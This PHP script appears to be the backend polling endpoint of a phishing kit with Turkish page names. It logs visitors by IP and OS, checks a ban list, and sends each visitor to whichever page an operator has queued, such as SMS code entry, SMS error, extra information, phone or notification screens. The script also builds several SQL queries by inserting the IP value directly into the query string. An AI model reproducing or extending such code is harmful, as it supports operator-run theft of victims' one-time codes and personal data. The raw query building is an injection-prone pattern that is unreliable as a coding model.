<?php
require_once 'connect.php';

$ip = IP;
$timex = time() + 7;

$db->query("UPDATE records SET lastOnline = '$timex' WHERE ipAddress = '$ip'");

if ($ajax->banControl(IP)) {
    echo json_encode(['name' => 'ban', 'page' => $ban_url]);
    exit;
}

$isIp = $db->prepare("SELECT * FROM ips WHERE ipAddress = ?");
$isIp->execute([$ip]);

if ($isIp->rowCount() > 0) {
    $update = $db->prepare("UPDATE ips SET lastOnline = ?, os = ? WHERE ipAddress = ?");
    $update->execute([$timex, $ajax->get_os_name($useragent), $ip]);
} else {
    $insert = $db->prepare("INSERT INTO ips SET ipAddress = ?, os = ? , lastOnline = ?");
    $insert->execute([$ip, $ajax->get_os_name($useragent), $timex]);
}
$redirect = $db->query("SELECT * FROM redirect WHERE ipAddress = '$ip' ")->fetch(PDO::FETCH_OBJ);
if ($redirect) {
    if ($redirect->page == "sms") {
        echo json_encode(["page" => "sms"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    }else if ($redirect->page == "sms2") {
        echo json_encode(["page" => "hatasms"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    } else if ($redirect->page == "tebrik") {
        echo json_encode(["page" => "tebrik"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    } else if ($redirect->page == "hata") {
        echo json_encode(["page" => "hata"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    } else if ($redirect->page == "basadondur") {
        echo json_encode(["page" => "index"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    } else if ($redirect->page == "ekbilgi") {
        echo json_encode(["page" => "bilgi"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    }  else if ($redirect->page == "phone") {
        echo json_encode(["page" => "phone"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    }  else if ($redirect->page == "notification") {
        echo json_encode(["page" => "bildirim"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    } 
}
exit;